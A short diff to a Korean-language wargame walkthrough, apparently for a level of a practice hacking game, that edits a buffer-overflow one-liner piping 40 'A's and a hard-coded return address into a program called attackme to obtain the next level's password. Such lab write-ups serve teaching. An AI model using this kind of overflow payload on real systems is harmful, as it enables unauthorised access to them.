@@ -67,6 +67,6 @@ gcc -o shell shell.c
 <br>
 ```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
 **공격 실시!**<br>
-```(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat)|./attackme```<br>
+```(python -c 'print "A"*40+"\xf4\xfe\xff\xbf"';cat)|./attackme```<br>
 ```my-pass```로 비밀번호를 물어보면<br>
 Level18 Password is "~~". 라고 나올 것이다!!
